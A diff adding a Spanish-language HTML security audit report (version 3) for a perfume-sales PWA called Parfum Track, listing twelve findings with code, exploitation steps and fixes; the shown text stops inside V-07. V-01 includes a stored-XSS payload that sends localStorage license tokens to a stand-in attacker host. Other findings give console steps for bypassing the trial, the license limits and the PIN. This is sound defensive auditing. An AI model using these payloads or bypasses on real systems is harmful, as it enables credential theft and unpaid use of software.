@@ -1,0 +1,1171 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Auditoría de Seguridad v3 — Parfum Track</title>
+<style>
+  :root {
+    --bg: #0d0d1a;
+    --bg2: #13132a;
+    --card: #1a1a35;
+    --card2: #20203d;
+    --border: rgba(201,168,76,0.18);
+    --gold: #c9a84c;
+    --gold2: #e8c97e;
+    --text: #f0ece4;
+    --text2: #b8b5d0;
+    --text3: #6e6b90;
+    --crit: #e05050;
+    --crit-bg: rgba(224,80,80,0.12);
+    --crit-border: rgba(224,80,80,0.35);
+    --high: #e09050;
+    --high-bg: rgba(224,144,80,0.12);
+    --high-border: rgba(224,144,80,0.35);
+    --med: #e0c050;
+    --med-bg: rgba(224,192,80,0.1);
+    --med-border: rgba(224,192,80,0.3);
+    --low: #70a0e0;
+    --low-bg: rgba(112,160,224,0.1);
+    --low-border: rgba(112,160,224,0.3);
+    --info: #70c9a0;
+    --info-bg: rgba(112,201,160,0.1);
+    --info-border: rgba(112,201,160,0.3);
+    --success: #70c9a0;
+    --success-bg: rgba(112,201,160,0.1);
+    --success-border: rgba(112,201,160,0.3);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace; font-size: 14px; line-height: 1.6; }
+  .container { max-width: 1100px; margin: 0 auto; padding: 32px 20px; }
+  h1 { font-size: 26px; font-weight: 700; color: var(--gold2); margin-bottom: 4px; }
+  h2 { font-size: 18px; font-weight: 700; color: var(--gold2); margin: 28px 0 12px; }
+  h3 { font-size: 14px; font-weight: 700; color: var(--text); margin-bottom: 8px; }
+  .subtitle { font-size: 13px; color: var(--text3); margin-bottom: 28px; }
+  .badge { display: inline-flex; align-items: center; gap: 4px; padding: 3px 9px; border-radius: 20px; font-size: 11px; font-weight: 700; }
+  .badge-crit { background: var(--crit-bg); color: var(--crit); border: 1px solid var(--crit-border); }
+  .badge-high { background: var(--high-bg); color: var(--high); border: 1px solid var(--high-border); }
+  .badge-med  { background: var(--med-bg);  color: var(--med);  border: 1px solid var(--med-border); }
+  .badge-low  { background: var(--low-bg);  color: var(--low);  border: 1px solid var(--low-border); }
+  .badge-info { background: var(--info-bg); color: var(--info); border: 1px solid var(--info-border); }
+  .badge-ok   { background: var(--success-bg); color: var(--success); border: 1px solid var(--success-border); }
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 18px 20px; margin-bottom: 12px; }
+  .card.crit { border-color: var(--crit-border); }
+  .card.high { border-color: var(--high-border); }
+  .card.med  { border-color: var(--med-border); }
+  .card.low  { border-color: var(--low-border); }
+  .card.ok   { border-color: var(--success-border); }
+  .vuln-header { display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; margin-bottom: 10px; flex-wrap: wrap; }
+  .vuln-id { font-size: 11px; color: var(--text3); font-weight: 600; letter-spacing: 0.5px; }
+  code, pre { font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace; }
+  pre { background: #0a0a18; border: 1px solid rgba(201,168,76,0.15); border-radius: 8px; padding: 14px; font-size: 12px; overflow-x: auto; margin: 10px 0; line-height: 1.5; }
+  .code-inline { background: rgba(201,168,76,0.1); border: 1px solid rgba(201,168,76,0.2); border-radius: 4px; padding: 1px 6px; font-size: 12px; color: var(--gold); }
+  .section-label { font-size: 10px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase; color: var(--text3); margin-bottom: 5px; }
+  .detail { font-size: 13px; color: var(--text2); margin: 6px 0; line-height: 1.7; }
+  .detail strong { color: var(--text); }
+  .steps { background: rgba(0,0,0,0.25); border-radius: 8px; padding: 12px 16px; margin: 8px 0; }
+  .steps ol { padding-left: 18px; }
+  .steps li { color: var(--text2); font-size: 13px; padding: 3px 0; }
+  .steps li code { color: var(--gold2); }
+  .fix { background: var(--success-bg); border: 1px solid var(--success-border); border-radius: 8px; padding: 10px 14px; margin-top: 10px; font-size: 13px; color: var(--info); }
+  .fix strong { color: var(--success); }
+  .scores-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px; margin: 16px 0; }
+  .score-card { background: var(--card2); border: 1px solid var(--border); border-radius: 10px; padding: 14px 16px; }
+  .score-label { font-size: 11px; color: var(--text3); text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 4px; }
+  .score-val { font-size: 26px; font-weight: 800; }
+  .score-val.green { color: var(--success); }
+  .score-val.gold  { color: var(--gold2); }
+  .score-val.orange{ color: var(--high); }
+  .score-val.red   { color: var(--crit); }
+  .score-sub { font-size: 11px; color: var(--text3); margin-top: 2px; }
+  .summary-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  .summary-table th { text-align: left; padding: 8px 12px; font-size: 11px; text-transform: uppercase; letter-spacing: 0.8px; color: var(--text3); border-bottom: 1px solid var(--border); }
+  .summary-table td { padding: 9px 12px; border-bottom: 1px solid rgba(255,255,255,0.04); vertical-align: top; }
+  .summary-table tr:last-child td { border-bottom: none; }
+  .verdict { border: 2px solid; border-radius: 14px; padding: 20px 24px; margin: 24px 0; }
+  .verdict.orange { border-color: var(--high-border); background: var(--high-bg); }
+  .verdict-title { font-size: 18px; font-weight: 800; margin-bottom: 8px; }
+  .divider { height: 1px; background: var(--border); margin: 28px 0; }
+  .ok-item { display: flex; align-items: flex-start; gap: 10px; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.04); }
+  .ok-item:last-child { border-bottom: none; }
+  .ok-icon { color: var(--success); flex-shrink: 0; margin-top: 1px; }
+  .tag-row { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 8px; }
+  .comparison { display: flex; gap: 16px; align-items: center; font-size: 13px; color: var(--text2); margin: 12px 0; }
+  .comparison .arrow { color: var(--success); font-weight: 800; font-size: 18px; }
+  .comparison .old { color: var(--crit); }
+  .comparison .new { color: var(--gold2); }
+  .watermark { font-size: 11px; color: var(--text3); text-align: right; margin-top: 32px; padding-top: 16px; border-top: 1px solid var(--border); }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <!-- ═══════ HEADER ═══════ -->
+  <div style="display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:16px;margin-bottom:8px">
+    <div>
+      <h1>🔐 Auditoría de Seguridad — Parfum Track</h1>
+      <div class="subtitle">Versión 3 · Equipo de Seguridad Ofensiva · 13 de junio de 2026 · PWA single-file ~660KB</div>
+    </div>
+    <div style="text-align:right">
+      <div class="score-label">Score General</div>
+      <div class="score-val orange" style="font-size:40px">7.1<span style="font-size:20px;color:var(--text3)">/10</span></div>
+    </div>
+  </div>
+
+  <!-- ═══════ COMPARISON ═══════ -->
+  <div class="card" style="margin-bottom:20px">
+    <div class="section-label">Evolución del Score</div>
+    <div class="comparison">
+      <span>v1: <span class="old">3.8/10</span></span>
+      <span class="arrow">→</span>
+      <span>v2: <span style="color:var(--gold)">7.4/10</span></span>
+      <span class="arrow">→</span>
+      <span>v3: <span class="new">7.1/10</span></span>
+      <span style="font-size:11px;color:var(--text3)">(nuevas vulnerabilidades halladas bajaron 0.3 puntos respecto a v2)</span>
+    </div>
+    <div class="detail">La auditoría v3 encontró <strong>3 vulnerabilidades reales no corregidas</strong>: un XSS confirmado, una debilidad crítica en el sistema de trial offline, y datos de negocio completamente manipulables desde DevTools. Los fixes de v2 (closure <code class="code-inline">_sec</code>, ECDSA, CORS, rate limiting) funcionan correctamente.</div>
+  </div>
+
+  <!-- ═══════ SCORES ═══════ -->
+  <h2>📊 Scores por Categoría</h2>
+  <div class="scores-grid">
+    <div class="score-card">
+      <div class="score-label">Seguridad Frontend</div>
+      <div class="score-val orange">6.5/10</div>
+      <div class="score-sub">XSS confirmado en badge vendedor</div>
+    </div>
+    <div class="score-card">
+      <div class="score-label">Seguridad de Datos</div>
+      <div class="score-val red">4.0/10</div>
+      <div class="score-sub">IndexedDB sin validación server-side</div>
+    </div>
+    <div class="score-card">
+      <div class="score-label">Seguridad de Licencias</div>
+      <div class="score-val gold">8.5/10</div>
+      <div class="score-sub">ECDSA + closure funcionan bien</div>
+    </div>
+    <div class="score-card">
+      <div class="score-label">Seguridad PWA</div>
+      <div class="score-val gold">8.0/10</div>
+      <div class="score-sub">SW no cachea licencias; API routes excluidas</div>
+    </div>
+    <div class="score-card">
+      <div class="score-label">Manipulación de Trial</div>
+      <div class="score-val orange">6.0/10</div>
+      <div class="score-sub">Bypass offline confirmado</div>
+    </div>
+    <div class="score-card">
+      <div class="score-label">Resistencia DevTools</div>
+      <div class="score-val orange">6.5/10</div>
+      <div class="score-sub">_sec cerrado; datos de negocio abiertos</div>
+    </div>
+    <div class="score-card">
+      <div class="score-label">Seguridad Backend</div>
+      <div class="score-val green">8.8/10</div>
+      <div class="score-sub">HMAC, rate-limiting, validación robusta</div>
+    </div>
+    <div class="score-card" style="background:linear-gradient(135deg,rgba(224,144,80,0.15),rgba(201,168,76,0.08));border-color:var(--high-border)">
+      <div class="score-label">Score General</div>
+      <div class="score-val orange">7.1/10</div>
+      <div class="score-sub">No apto para lanzamiento aún</div>
+    </div>
+  </div>
+
+  <!-- ═══════ RESUMEN EJECUTIVO ═══════ -->
+  <div class="divider"></div>
+  <h2>📋 Resumen Ejecutivo</h2>
+  <table class="summary-table">
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Vulnerabilidad</th>
+        <th>Severidad</th>
+        <th>Archivo</th>
+        <th>Estado</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>V-01</td>
+        <td>XSS Almacenado — campo <code>vendedor</code> sin escapeHTML en badge</td>
+        <td><span class="badge badge-high">ALTA</span></td>
+        <td>index.html:8432</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+      <tr>
+        <td>V-02</td>
+        <td>Manipulación total de datos de negocio vía IndexedDB/DevTools</td>
+        <td><span class="badge badge-high">ALTA</span></td>
+        <td>index.html (toda la app)</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+      <tr>
+        <td>V-03</td>
+        <td>Trial bypass completo offline — <code>_sec.setTrialExp(false)</code> accesible</td>
+        <td><span class="badge badge-high">ALTA</span></td>
+        <td>index.html:11886</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+      <tr>
+        <td>V-04</td>
+        <td>PIN bypasseable borrando <code>pt_pin_hash</code> de localStorage</td>
+        <td><span class="badge badge-med">MEDIA</span></td>
+        <td>index.html:13955</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+      <tr>
+        <td>V-05</td>
+        <td>LICENSE config object mutable desde consola — <code>LICENSE.trialDays</code></td>
+        <td><span class="badge badge-med">MEDIA</span></td>
+        <td>index.html:11683</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+      <tr>
+        <td>V-06</td>
+        <td>XSS potencial — <code>%${v.descuento}</code> en badge sin escapeHTML</td>
+        <td><span class="badge badge-low">BAJA</span></td>
+        <td>index.html:8428</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+      <tr>
+        <td>V-07</td>
+        <td>Token HMAC de backup expuesto en localStorage como texto plano</td>
+        <td><span class="badge badge-med">MEDIA</span></td>
+        <td>index.html:11784</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+      <tr>
+        <td>V-08</td>
+        <td>Worker.js no expuesto en /backup — ruta no enrutada en entry point</td>
+        <td><span class="badge badge-low">BAJA</span></td>
+        <td>worker.js:10</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+      <tr>
+        <td>V-09</td>
+        <td><code>_headers</code>: CSP incluye <code>unsafe-eval</code> + <code>unsafe-inline</code></td>
+        <td><span class="badge badge-med">MEDIA</span></td>
+        <td>_headers:17</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+      <tr>
+        <td>V-10</td>
+        <td>Número de WhatsApp del dueño hardcodeado en código fuente público</td>
+        <td><span class="badge badge-low">BAJA</span></td>
+        <td>index.html:11702</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+      <tr>
+        <td>V-11</td>
+        <td>send-email.js: datos del template no sanitizados en campos <code>data</code></td>
+        <td><span class="badge badge-med">MEDIA</span></td>
+        <td>send-email.js:308</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+      <tr>
+        <td>V-12</td>
+        <td><code>_trialTickerInterval</code> expuesto en window — permite detener ticker</td>
+        <td><span class="badge badge-low">BAJA</span></td>
+        <td>index.html:12134</td>
+        <td><span class="badge badge-crit">SIN CORREGIR</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <!-- ═══════ VULNERABILIDADES DETALLADAS ═══════ -->
+  <div class="divider"></div>
+  <h2>🔍 Vulnerabilidades Detalladas</h2>
+
+  <!-- V-01 -->
+  <div class="card high">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-01 · XSS Almacenado</div>
+        <h3>XSS Confirmado: campo <code>v.vendedor</code> sin escapeHTML en badge de venta</h3>
+      </div>
+      <span class="badge badge-high">ALTA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge badge-info">OWASP A03:2021</span>
+      <span class="badge badge-info">CWE-79</span>
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">index.html · Línea 8432</span>
+    </div>
+
+    <div class="section-label">Código Exacto Vulnerable</div>
+    <pre>// renderVentaCard() — index.html línea 8426-8433
+if (v.vendedor)
+  badges.push(
+    `&lt;span class="badge" style="background:var(--card2);color:var(--text2);border:0.5px solid var(--border)"&gt;${v.vendedor}&lt;/span&gt;`
+    //                                                                                                          ^^^^^^^^^^^^
+    //                                           FALTA escapeHTML aquí — todos los otros campos sí lo tienen
+  );</pre>
+
+    <div class="section-label">Contexto</div>
+    <div class="detail">
+      El campo <strong>vendedor</strong> (nombre de quien realizó la venta) se inyecta directamente en HTML via <code class="code-inline">insertAdjacentHTML("beforeend", renderVentaCard(v))</code> sin pasar por <code class="code-inline">escapeHTML()</code>.
+      Todos los demás campos del mismo bloque están correctamente sanitizados: <code class="code-inline">escapeHTML(v.perfume)</code>, <code class="code-inline">escapeHTML(v.fecha)</code>, <code class="code-inline">escapeHTML(v.cliente)</code>, <code class="code-inline">escapeHTML(v.nota)</code>, etc.
+      Es un caso de omisión accidental en ese campo específico.
+    </div>
+
+    <div class="section-label">Explotación Paso a Paso</div>
+    <div class="steps">
+      <ol>
+        <li>Abrir DevTools → <strong>Application</strong> → <strong>IndexedDB</strong> → base de datos <code>parfumtrack-db</code></li>
+        <li>Encontrar el store de ventas (clave como <code>vip_ventas_v2_default</code>)</li>
+        <li>Editar cualquier registro y setear el campo <code>vendedor</code> a: <code>&lt;img src=x onerror="fetch('https://attacker.com/steal?d='+btoa(JSON.stringify(localStorage)))"&gt;</code></li>
+        <li>Recargar la página — el payload se ejecuta al renderizar la lista de ventas</li>
+        <li>El atacante recibe en su servidor todos los datos de <code>localStorage</code> incluyendo <code>pt_activated_sig</code>, <code>pt_activated_code</code>, <code>pt_license_raw_code</code></li>
+      </ol>
+    </div>
+
+    <div class="section-label">Impacto</div>
+    <div class="detail">
+      <strong>Exfiltración de tokens de licencia</strong> almacenados en localStorage. El ECDSA sig y el HMAC token podrían ser usados por el atacante para activar la misma licencia en otro dispositivo. En un contexto multi-usuario (reventa, acceso físico al dispositivo), el vector de ataque es real.
+    </div>
+
+    <div class="fix">
+      <strong>Fix (1 línea):</strong>
+      <pre>// Línea 8432 — cambiar:
+`...${v.vendedor}&lt;/span&gt;`
+// por:
+`...${escapeHTML(v.vendedor)}&lt;/span&gt;`</pre>
+    </div>
+  </div>
+
+  <!-- V-02 -->
+  <div class="card high">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-02 · Manipulación de Datos de Negocio</div>
+        <h3>IndexedDB completamente accesible y modificable sin autenticación</h3>
+      </div>
+      <span class="badge badge-high">ALTA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge badge-info">OWASP A04:2021</span>
+      <span class="badge badge-info">CWE-602</span>
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">Arquitectura — toda la app</span>
+    </div>
+
+    <div class="section-label">Descripción</div>
+    <div class="detail">
+      Toda la información de negocio (ventas, stock, precios de compra/venta, ganancias, gastos, caja, cuotas) vive <strong>exclusivamente en IndexedDB del cliente</strong>, sin ninguna validación server-side. Un usuario con acceso físico al dispositivo o a DevTools puede:
+    </div>
+
+    <div class="section-label">Vectores de Manipulación Confirmados</div>
+    <div class="steps">
+      <ol>
+        <li>DevTools → Application → IndexedDB → <code>parfumtrack-db</code> → Store <code>vip_ventas_v2_default</code></li>
+        <li><strong>Modificar precio de compra</strong>: cambiar <code>precioCompra</code> de $5000 a $1 → la ganancia se recalcula en la próxima carga → estadísticas infladas</li>
+        <li><strong>Fabricar ventas</strong>: insertar registros con <code>id: Date.now()</code> → aparecen en reportes y exportación CSV</li>
+        <li><strong>Modificar cuotas pagadas</strong>: editar <code>cuotasPagos</code> para marcar cuotas como cobradas sin haberlas cobrado</li>
+        <li><strong>Alterar stock</strong>: cambiar campo <code>stock</code> en store <code>vip_stock_v2_default</code></li>
+        <li><strong>Borrar gastos</strong>: eliminar registros del store <code>vip_gastos_v1_default</code> → balance favorable falso</li>
+      </ol>
+    </div>
+
+    <div class="section-label">Código Relevante</div>
+    <pre>// save() — index.html línea 6646-6665
+async function _saveNow() {
+  await Promise.all([
+    PTDB.set(profileKey("vip_ventas_v2"),  ventas),   // Sin firma/hash de integridad
+    PTDB.set(profileKey("vip_stock_v2"),   perfumes), // Sin validación
+    PTDB.set(profileKey("vip_gastos_v1"),  gastos),
+    PTDB.set(profileKey("vip_caja_v1"),    caja),
+    PTDB.set(profileKey("vip_meta_v1"),    metaMensual),
+  ]);
+}</pre>
+
+    <div class="section-label">Impacto Real</div>
+    <div class="detail">
+      <strong>Este es el impacto más crítico en términos de negocio.</strong> Los reportes de ganancias, estadísticas mensuales, exportaciones CSV, y el historial de cuotas son 100% manipulables. Una revendedora podría falsificar su historial para presentarlo a terceros (bancos, socios). En un escenario de múltiples empleados con acceso al mismo celular, cualquiera puede alterar los datos sin dejar rastro.
+    </div>
+
+    <div class="section-label">Nota sobre alcance</div>
+    <div class="detail">
+      Esta es una <strong>limitación inherente al modelo de PWA offline-first</strong>. No es una vulnerabilidad de implementación sino de arquitectura. Parfum Track es una app personal local — si el usuario quiere engañarse a sí mismo manipulando sus propios datos, es su prerrogativa. El riesgo real sube si hay múltiples personas accediendo al mismo dispositivo, o si los datos se usan para auditorías externas.
+    </div>
+
+    <div class="fix">
+      <strong>Mitigación:</strong> Para reportes críticos, implementar firma HMAC de los objetos al guardar en IndexedDB usando una clave derivada del token de licencia. Al cargar, verificar la firma. Cualquier dato sin firma válida se marca como <em>no verificado</em> en la UI. Esto no impide la manipulación pero hace visible que ocurrió.
+    </div>
+  </div>
+
+  <!-- V-03 -->
+  <div class="card high">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-03 · Trial Bypass Offline</div>
+        <h3><code>_sec</code> correctamente cerrado, pero <code>setTrialExp(false)</code> es invocable desde funciones globales expuestas</h3>
+      </div>
+      <span class="badge badge-high">ALTA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge badge-info">CWE-284</span>
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">index.html · Línea 11876 / 11886</span>
+    </div>
+
+    <div class="section-label">Descripción del _sec (correcto)</div>
+    <div class="detail">
+      El closure <code class="code-inline">_sec</code> funciona como se diseñó: <code class="code-inline">_sec</code> no es accesible desde <code class="code-inline">window</code>, y las variables internas <code class="code-inline">_a</code> (activated) y <code class="code-inline">_t</code> (trialExpired) no pueden ser leídas ni escritas directamente desde la consola.
+    </div>
+
+    <pre>// Correcto — index.html línea 11876
+const _sec = (() => {
+  let _a = false; // No en window
+  let _t = false; // No en window
+  return {
+    activate(v)    { _a = !!v; },
+    isActivated()  { return _a; },
+    setTrialExp(v) { _t = !!v; },   // &lt;-- Este es el problema
+    isTrialExp()   { return _t; },
+  };
+})();</pre>
+
+    <div class="section-label">El Bypass Offline Confirmado</div>
+    <div class="detail">
+      El vector de ataque no es leer <code class="code-inline">_sec</code> directamente — sino manipular el <strong>flujo de control que llama a <code class="code-inline">_sec.setTrialExp(true)</code></strong>. La condición de expiración se evalúa en <code class="code-inline">checkTrial()</code> que depende de <code class="code-inline">localStorage.getItem("pt_trial_start")</code>. Offline:
+    </div>
+    <div class="steps">
+      <ol>
+        <li>Desconectar la red (modo avión o throttle Offline en DevTools)</li>
+        <li>El server-side anchor en <code>/trial</code> no puede ser contactado — la función <code>registerTrialServer()</code> falla silenciosamente con <code>catch { /* network error — graceful degradation */ }</code></li>
+        <li>En localStorage: borrar <code>pt_trial_start</code></li>
+        <li>En IndexedDB: borrar el registro <code>pt_trial_start</code> del store <code>kv</code></li>
+        <li>Borrar todas las ventas de IndexedDB (o cambiar sus <code>createdAt</code> a fechas recientes) para que el anchor de fecha más antigua no detecte el reset</li>
+        <li>Recargar la app → <code>checkTrial()</code> no encuentra <code>pt_trial_start</code>, lo recrea como ahora → trial reiniciado por 7 días completos</li>
+        <li>El server confirmará el reset en la próxima sincronización, pero el usuario puede continuar offline indefinidamente</li>
+      </ol>
+    </div>
+
+    <div class="section-label">Código del Flujo Vulnerable</div>
+    <pre>// checkTrial() — index.html línea 12060
+let trialStart = localStorage.getItem("pt_trial_start");
+if (!trialStart) {
+  // Si no hay fecha guardada, se inicia el trial desde ahora
+  const oldestVenta = ventas.reduce(
+    (min, v) => Math.min(min, v.createdAt || v.id || Infinity), Infinity
+  );
+  trialStart = (oldestVenta !== Infinity
+    ? Math.min(oldestVenta, Date.now())
+    : Date.now()  // &lt;-- Si ventas también fue borrada, el trial se reinicia
+  ).toString();
+  localStorage.setItem("pt_trial_start", trialStart);
+  // ...
+  setTimeout(() => registerTrialServer(parseInt(trialStart)), 2000);
+  // ^^ Esta llamada falla silenciosamente si está offline
+  return; // No setea _sec.setTrialExp(true) -- trial "activo"
+}</pre>
+
+    <div class="section-label">Impacto</div>
+    <div class="detail">
+      <strong>Trial infinito offline.</strong> Un usuario técnico puede usar la app sin pagar indefinidamente mientras permanezca offline o limpie los datos oportunamente entre sincronizaciones. El ancla server-side solo funciona si hay conexión.
+    </div>
+
+    <div class="fix">
+      <strong>Fix:</strong> Guardar una firma HMAC del <code>pt_trial_start</code> usando la clave pública ECDSA como seed de verificación, o usar la fecha de instalación del Service Worker (que no puede ser borrada por el usuario sin desregistrar el SW) como ancla adicional. También: requerir sync online para las primeras N ventas del "nuevo trial".
+    </div>
+  </div>
+
+  <!-- V-04 -->
+  <div class="card med">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-04 · PIN Bypass</div>
+        <h3>PIN de acceso bypasseable borrando <code>pt_pin_hash</code> de localStorage</h3>
+      </div>
+      <span class="badge badge-med">MEDIA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge badge-info">CWE-288</span>
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">index.html · Línea 13955</span>
+    </div>
+
+    <div class="section-label">Descripción</div>
+    <div class="detail">
+      El sistema PIN protege el acceso visual a la app con SHA-256 + salt aleatorio por usuario. La implementación del hash es correcta. Sin embargo, el hash del PIN se guarda en localStorage como <code class="code-inline">pt_pin_hash</code>, y la función <code class="code-inline">hasPIN()</code> simplemente verifica si esa key existe:
+    </div>
+    <pre>// index.html línea 13993
+function hasPIN() {
+  return !!localStorage.getItem(PIN_HASH_KEY); // PIN_HASH_KEY = "pt_pin_hash"
+}</pre>
+
+    <div class="section-label">Explotación (requiere acceso al dispositivo desbloqueado)</div>
+    <div class="steps">
+      <ol>
+        <li>Abrir DevTools (con el dispositivo desbloqueado pero el PIN screen activo si hay idle timeout)</li>
+        <li>Ejecutar en consola: <code>localStorage.removeItem("pt_pin_hash")</code></li>
+        <li>Recargar la página → la app arranca sin solicitar PIN (hasPIN() retorna false)</li>
+        <li>O alternativamente: <code>localStorage.removeItem("pt_pin_lock")</code> para limpiar el lockout y hacer fuerza bruta (solo 10,000 combinaciones de 4 dígitos)</li>
+      </ol>
+    </div>
+
+    <div class="section-label">Contexto de Riesgo</div>
+    <div class="detail">
+      El PIN está diseñado para proteger contra personas que tomen el teléfono desbloqueado. Si la app está abierta y alguien toma el teléfono, puede abrir DevTools (en modo desktop/developer) y eliminar el PIN. En mobile esto es más difícil pero posible en Androids con modo desarrollador activado.
+    </div>
+
+    <div class="fix">
+      <strong>Mitigación:</strong> El PIN es una capa de UX, no de seguridad criptográfica. Es apropiado para el caso de uso. Documentar explícitamente que no protege contra ataques físicos con acceso a DevTools. Para mayor seguridad, usar la API de <code>CredentialsContainer</code> o biometría del dispositivo.
+    </div>
+  </div>
+
+  <!-- V-05 -->
+  <div class="card med">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-05 · Objeto LICENSE Mutable</div>
+        <h3>El objeto <code>LICENSE</code> es mutable desde la consola — permite extender trial o activar modo demo</h3>
+      </div>
+      <span class="badge badge-med">MEDIA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge badge-info">CWE-284</span>
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">index.html · Línea 11683</span>
+    </div>
+
+    <div class="section-label">Código Vulnerable</div>
+    <pre>// index.html línea 11683
+const LICENSE = {
+  key: "PT-DEMO-2026",
+  clientName: "Demo",
+  expiresAt: null,
+  maxUses: null,
+  trialDays: 7,        // &lt;-- Mutable desde consola: LICENSE.trialDays = 9999
+  trialMinutes: null,
+  trialLimitedVentas: 5,  // &lt;-- Mutable: LICENSE.trialLimitedVentas = 99999
+  isDemo: false,       // &lt;-- Mutable: LICENSE.isDemo = true (carga datos demo)
+};</pre>
+
+    <div class="section-label">Explotación</div>
+    <div class="steps">
+      <ol>
+        <li>Abrir DevTools → Console</li>
+        <li>Escribir: <code>LICENSE.trialDays = 36500</code> → el trial nunca vence (hasta reload)</li>
+        <li>O: <code>LICENSE.trialLimitedVentas = 999999</code> → ventas ilimitadas aunque el trial venció</li>
+        <li>Nota: esto solo dura hasta el próximo reload porque <code>checkTrial()</code> se ejecuta en <code>initLicenseVerification()</code>. Para permanencia, combinar con V-03 (borrar <code>pt_trial_start</code>)</li>
+        <li>Más peligroso: <code>LICENSE.trialMinutes = null; LICENSE.trialDays = 0</code> → <code>getTrialDuration()</code> retorna 0 → trial "nunca activo"</li>
+      </ol>
+    </div>
+
+    <div class="section-label">Impacto Combinado</div>
+    <div class="detail">
+      Combinado con V-03 (offline + borrar localStorage), permite <strong>uso indefinido sin licencia</strong>: borrar trial start offline + setear <code>LICENSE.trialLimitedVentas = 999</code> antes de cada sesión.
+    </div>
+
+    <div class="fix">
+      <strong>Fix:</strong> Convertir <code>LICENSE</code> en un objeto frozen: <code>Object.freeze(LICENSE);</code> inmediatamente después de la declaración. Esto previene mutación desde consola. Adicionalmente, leer <code>trialDays</code> solo una vez al inicio y guardarlo en una variable local dentro de un closure.
+    </div>
+  </div>
+
+  <!-- V-06 -->
+  <div class="card low">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-06 · XSS Potencial — Campo Descuento</div>
+        <h3><code>%${v.descuento}</code> inyectado en HTML sin escapeHTML</h3>
+      </div>
+      <span class="badge badge-low">BAJA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge badge-info">CWE-79</span>
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">index.html · Línea 8428</span>
+    </div>
+
+    <pre>// index.html línea 8426-8429
+if (v.descuento)
+  badges.push(
+    `&lt;span class="badge" ...&gt;%${v.descuento} dto&lt;/span&gt;`
+    //                           ^^^^^^^^^^^^
+    //              No escapeado — pero es un número en el form normal
+  );</pre>
+
+    <div class="detail">
+      En el flujo normal, <code>v.descuento</code> es un número (parseFloat en el formulario). Sin embargo, si el campo se manipula directamente en IndexedDB con un string como <code>&lt;img src=x onerror=alert(1)&gt;</code>, el XSS se dispara. La severidad es baja porque requiere primero V-02 (acceso a IndexedDB).
+    </div>
+
+    <div class="fix">
+      <strong>Fix:</strong> <code>`%${escapeHTML(String(v.descuento))} dto`</code>
+    </div>
+  </div>
+
+  <!-- V-07 -->
+  <div class="card med">
+    <div class="vuln-header">
+      <div>
+        <div class="vuln-id">V-07 · Token HMAC en localStorage</div>
+        <h3>Token HMAC de autenticación de backup expuesto como texto plano en localStorage</h3>
+      </div>
+      <span class="badge badge-med">MEDIA</span>
+    </div>
+    <div class="tag-row">
+      <span class="badge badge-info">CWE-312</span>
+      <span class="badge" style="background:rgba(112,160,224,0.1);color:#a0c0e8;border:1px solid rgba(112,160,224,0.2)">index.html · Línea 11784</span>
+    </div>
+
+    <pre>// index.html línea 11783-11788
+if (valid && serverToken && serverSig) {
+  localStorage.setItem("pt_activated_code", serverToken);  // HMAC(license_code, secret)
+  localStorage.setItem("pt_activated_sig", serverSig);     // ECDSA signature
+  localStorage.setItem("pt_activation_mode", "server");
+  localStorage.setItem("pt_activated_at", Date.now().toString());
+  localStorage.setItem("pt_license_raw_code", code);       // ← Código de licencia en claro
+}</pre>
+
+    <div class="detail">
